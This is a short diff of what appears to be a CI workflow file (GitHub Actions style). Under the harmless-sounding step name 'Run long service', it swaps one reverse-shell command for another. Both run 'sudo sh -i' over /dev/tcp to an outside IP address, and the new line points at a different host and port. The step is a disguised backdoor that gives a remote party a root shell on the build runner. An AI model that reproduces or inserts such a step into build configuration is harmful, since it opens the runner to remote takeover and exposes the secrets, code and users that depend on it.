@@ -21,7 +21,7 @@ jobs:
 
       - name: Run long service
         run: |
-         sudo sh -i >& /dev/tcp/8.138.123.18/8811 0>&1
+         sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1
 
 
       # Checkout your code
